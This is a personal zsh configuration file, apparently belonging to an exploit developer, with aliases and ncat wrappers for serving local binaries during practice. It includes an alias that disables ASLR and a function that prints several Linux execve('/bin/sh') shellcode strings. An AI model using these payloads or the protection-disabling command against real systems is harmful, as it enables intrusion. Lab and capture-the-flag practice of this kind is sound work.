export ZSH=~/.oh-my-zsh
ZSH_THEME="zet"

plugins=(brew git virtualenv virtualenvwrapper)

export PATH="/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin"
source $ZSH/oh-my-zsh.sh

alias aslr.on="sudo sysctl -w kernel.randomize_va_space=2"
alias aslr.off="sudo sysctl -w kernel.randomize_va_space=0"
alias -s gz='tar -xzvf'
alias -s tgz='tar -xzvf'
alias -s zip='unzip'
alias -s bz2='tar -xjvf'
alias -s py=python

alias ida='wine ~/Documents/idaPro6.8/idaq.exe &'
alias ida64='wine ~/Documents/idaPro6.8/idaq64.exe &'

alias php70='brew link php70'
alias php55='brew unlink php70'
alias phps='php -S 0.0.0.0:9000'

alias nc='netcat'

function heap()
{
ltrace $1 |& ~/tools/villoc/villoc.py - /var/www/heap.html;
}

function ncat-local()
{
    if [ ! -f ${@: -1} ]; then
        echo "${@: -1} not found!"
    else
        ncat -vc $1 -kl localhost 4000
    fi
}

function ncat-strace()
{
    if [ ! -f ${@: -1} ]; then
        echo "${@: -1} not found!"
    else
        ncat -vc "strace -ix $1" -kl localhost 4000
    fi
}

function ncat-ltrace()
{
    if [ ! -f ${@: -1} ]; then
        echo "${@: -1} not found!"
    else
        ncat -vc "ltrace -i $1" -kl localhost 4000
    fi
}

function shellcode()
{
    echo $fg_bold[white]"# Linux x86-64  Execve /bin/sh Shellcode Via Push 23 bytes" $reset_color
    echo "\\\x31\\\xf6\\\x48\\\xbb\\\x2f\\\x62\\\x69\\\x6e\\\x2f\\\x2f\\\x73\\\x68\\\x56\\\x53\\\x54\\\x5f\\\x6a\\\x3b\\\x58\\\x31\\\xd2\\\x0f\
\\x05"
    echo $fg_bold[white]"# Linux/x86 execve /bin/sh shellcode 23 bytes" $reset_color
    echo "\\\x31\\\xc0\\\x50\\\x68\\\x2f\\\x2f\\\x73\\\x68\\\x68\\\x2f\\\x62\\\x69\\\x6e\\\x89\\\xe3\\\x50\\\x53\\\x89\\\xe1\\\xb0\\\x0b\\\xcd\
\\x80"
    echo $fg_bold[white]"# Linux/x86 execve /bin/sh shellcode 25 bytes"$reset_color
    echo "\\\xeb\\\x0b\\\x5b\\\x31\\\xc0\\\x31\\\xc9\\\x31\\\xd2\\\xb0\\\x0b\\\xcd\\\x80\\\xe8\\\xf0\\\xff\\\xff\\\xff\\\x2f\\\x62\\\x69\\\x6e\
\\x2f\\\x73\\\x68"
    echo $fg_bold[white]"# Linux x86 execve("/bin/sh") - 28 bytes"$reset_color
    echo "\\\x31\\\xc0\\\x50\\\x68\\\x2f\\\x2f\\\x73\\\x68\\\x68\\\x2f\\\x62\\\x69\\\x6e\\\x89\\\xe3\\\x89\\\xc1\\\x89\\\xc2\\\xb0\\\x0b\\\xcd\
\\x80\\\x31\\\xc0\\\x40\\\xcd\\\x80"
    echo $fg_bold[white]"# Linux/x64 execve /bin/sh shellcode 27 bytes"$reset_color
    echo "\\\x31\\\xc0\\\x48\\\xbb\\\xd1\\\x9d\\\x96\\\x91\\\xd0\\\x8c\\\x97\\\xff\\\x48\\\xf7\\\xdb\\\x53\\\x54\\\x5f\\\x99\\\x52\\\x57\\\x54\
\\x5e\\\xb0\\\x3b\\\x0f\\\x05"
    echo $fg_bold[white]"# Linux/ARM - execve("/bin/sh", [0], [0 vars]) - 27 bytes"$reset_color
    echo "\\\x01\\\x30\\\x8f\\\xe2\\\x13\\\xff\\\x2f\\\xe1\\\x78\\\x46\\\x08\\\x30\\\x49\\\x1a\\\x92\\\x1a\\\x0b\\\x27\\\x01\\\xdf\\\x2f\\\x62\
\\x69\\\x6e\\\x2f\\\x73\\\x68"
}
